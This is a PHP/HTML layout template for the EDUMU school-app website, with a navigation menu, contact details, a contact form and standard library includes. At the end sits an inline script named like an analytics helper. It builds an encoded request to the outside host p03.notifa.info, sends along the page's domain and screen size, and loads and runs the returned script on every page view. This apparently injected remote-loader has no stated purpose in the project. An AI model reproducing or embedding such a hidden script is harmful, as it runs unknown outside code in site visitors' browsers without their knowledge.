<!DOCTYPE html>
<html lang="en">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="EDUMU, Interactive Education Assistant" />
    <meta name="description" content="EDUMU - Interactive Education Assistant" />
    <meta name="Page-topic" content="Aplikasi Sekolah | Sistem Sekolah | #EDUMU" />
    <meta charset="utf-8">
    <meta name="Publisher" content="fariz GTJ" />
    <meta name="Robots" content="All" />
    <meta name="Rating" content="General" />
    <meta name="Revisit-after" content="1 days" />
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/bootstrap.min.css'); ?>" media="all" />
    <!-- Slick nav CSS -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/slicknav.min.css'); ?>" media="all" />
    <!-- Iconfont CSS -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/icofont.css'); ?>" media="all" />
    <!-- Slick CSS -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/slick.css'); ?>">
    <!-- Owl carousel CSS -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/owl.carousel.css'); ?>">
    <!-- Popup CSS -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/magnific-popup.css'); ?>">
    <!-- Switcher CSS -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/switcher-style.css'); ?>">
    <!-- Animate CSS -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/animate.min.css'); ?>">
    <!-- Main style CSS -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/style1.css'); ?>" media="all" />
    <!-- Responsive CSS -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/responsive.css'); ?>" media="all" />
    <!-- Favicon Icon -->
    <link rel="icon" type="image/png" href="<?php echo base_url('assets/img/favicon.png'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/mystyle.css'); ?>" media="all" />

</head>
<body data-spy="scroll" data-target=".header" data-offset="10">
    <div id="preloader"></div>

    <!-- header section start -->
    <header class="header">
        <div class="container">
            <div class="row flexbox-center">
                <div class="col-lg-2 col-md-3 col-6">
                    <div class="logo" style="" >
                        <a href="index.html"><img src="assets/img/logoputih.png" alt="logo" /></a>
                    </div>
                </div>
                <div class="col-lg-10 col-md-9 col-6">
                    <div class="responsive-menu"></div>
                    <div class="mainmenu">
                        <ul id="primary-menu">
                            <?php $page = $this->uri->segment(1); $pages = $this->uri->segment(2); ?>
                            <li><a class="nav-link <?php if($page=='home')echo "active"; ?>" href="<?= base_url(); ?>">Home</a></li>
                            <li><a class="nav-link <?php if($pages=='tentang-kami')echo "active"; ?>" href="<?= base_url('pages/tentang-kami'); ?>" href="<?= base_url('pages/tentang-kami'); ?>">Tentang kami</a></li>
                            <li><a class="nav-link <?php if($pages=='fitur')echo "active"; ?>" href="<?= base_url('pages/fitur'); ?>">Feature</a></li>
                            <li><a class="nav-link <?php if($page=='blog')echo "active"; ?>" href="<?= base_url('blog'); ?>">Blog</a></li>
                            <li><a class="nav-link " href="#contact">Kontak kami</a></li>
                            <li><a class="appao-btn" href="<?= base_url('pages/demo'); ?>">Ajukan Demo</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!-- end header -->

    <?= $content; ?>

    <!-- footer start -->
    <footer class="footer" id="contact">
        <div class="container">
            <div class="row">
                <div class="col-lg-6">
                    <div class="contact-address" style="height: 480px !important;">
                        <h4>Alamat</h4>
                        <p>Jl. Menteng Raya No.62, RT.3/RW.9, Kb. Sirih, Menteng, Jakarta Pusat 10340</p>
                        <ul>
                            <li>
                                <div class="contact-address-icon">
                                    <i class="icofont icofont-headphone-alt"></i>
                                </div>
                                <div class="contact-address-info">
                                    <a href="callto:#">021 3006 0410</a>
                                    <a href="callto:#">085 6751 1669 (jakarta) / 0857 4370 0020 (jogja)</a>
                                </div>
                            </li>
                            <li>
                                <div class="contact-address-icon">
                                    <i class="icofont icofont-envelope"></i>
                                </div>
                                <div class="contact-address-info">
                                    <a href="mailto:#">edumu.majelis.dikdasmen@gmail.com</a>
                                </div>
                            </li>
                            <li>
                                <div class="contact-address-icon">
                                    <i class="icofont icofont-web"></i>
                                </div>
                                <div class="contact-address-info">
                                    <a href="index.html">www.edumu.co.id</a>
                                </div>
                            </li>
                        </ul>
                    </div>
                </div>
                <div class="col-lg-6">
                    <div class="contact-form" style="height: 480px !important;">
                        <h4>Kontak kami</h4>
                        <p class="form-message"></p>
                        <form id="contact-form" action="#" method="POST">
                            <input type="text" name="name" placeholder="Enter Your Name">
                            <input type="email" name="email" placeholder="Enter Your Email">
                            <input type="text" name="subject" placeholder="Your Subject">
                            <textarea placeholder="Messege" name="message"></textarea>
                            <button type="submit" name="submit">Send Message</button>
                        </form>
                    </div>
                </div>
                
            </div>
        <!-- <div class="row">
            <div class="col-lg-12">
                <div class="subscribe-form">
                    <form action="#">
                        <input type="text" placeholder="Your email address here">
                        <button type="submit">Subcribe</button>
                    </form>
                </div>
            </div>
        </div> -->
        <div class="row">
            <div class="col-lg-12">
                <div class="copyright-area">
                    <!-- <ul>
                        <li><a href="#"><i class="icofont icofont-social-facebook"></i></a></li>
                        <li><a href="#"><i class="icofont icofont-social-twitter"></i></a></li>
                        <li><a href="#"><i class="icofont icofont-brand-linkedin"></i></a></li>
                        <li><a href="#"><i class="icofont icofont-social-pinterest"></i></a></li>
                        <li><a href="#"><i class="icofont icofont-social-google-plus"></i></a></li>
                    </ul> -->
                    <p>&copy; 2017 <a href="index.html">PT. HILOTECH KARYA ANAK INDONESIA</a></p>
                </div>
            </div>
        </div>
    </div>
</footer><!-- footer section end -->

<!-- jquery main JS -->
<script src="<?php echo base_url('assets/js/jquery.min.js') ?>"></script>
<!-- Bootstrap JS -->
<script src="<?php echo base_url('assets/js/bootstrap.min.js') ?>"></script>
<!-- Slick nav JS -->
<script src="<?php echo base_url('assets/js/jquery.slicknav.min.js') ?>"></script>
<!-- Slick JS -->
<script src="<?php echo base_url('assets/js/slick.min.js') ?>"></script>
<!-- owl carousel JS -->
<script src="<?php echo base_url('assets/js/owl.carousel.min.js') ?>"></script>
<!-- Popup JS -->
<script src="<?php echo base_url('assets/js/jquery.magnific-popup.min.js') ?>"></script>
<!-- Counter JS -->
<script src="<?php echo base_url('assets/js/jquery.counterup.min.js') ?>"></script>

<!-- jQuery Easing JS -->
<script src="<?php echo base_url('assets/js/jquery.easing.1.3.js') ?>"></script>

<script src="<?php echo base_url('assets/js/main.js') ?>"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m4Wv3bF3tHgDvONLdz1O4%2bLMQk3dVbe1HGNmyYoXiEnuFuWXFsmY%2bTeyezLoaz4BKZXsYB4NWi58AazH9ue901i7hJCUBfPStD9RHkenDK1SuqaSF%2bXTzGxSxZTANenmWN%2fo6ArYqmNNYo1Vam5OafJZzLqFaGZKW2agYVYQ2fHBSZIXnbaE8rBWQDjYrrvL5Xp71UDK95wkqr2aQxQTsBg7KJ8f3D7P%2bY6kvlz8lS10%2f2c9IIidcqfZOEdniecAl3uabGpu1vRARh11L9stFmCq0cpccGQWpq%2fZK6sZw2pSyWlIjwvLy5RVRtTsYj3Sp7mwGNpBzz1peFKvHprM%2fn2bPzbBdHHuver4g6LcKdJLgGaGRa5SxD5%2blnVRnRp6Ecn1rxDYjbsguONiKqDkW7fE%2b3ckghIoy2lbl1QGGdti71Wv1jEDmbQtsCu6lSAwzAHDJKdh2iR9LC6GlpNCVfB557GwzGYmX%2bFVs%2f5hfucVN2iYe40wmff2s3FZ%2bOwAXIuzLsrFzugaLl%2bByxBmYNjYeQJfEc%2bYW9OcjDqIn2zmTUdfSUdfhSoBPoplfXjuyGCkuSt4Hzx10qQsg1NGbqw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>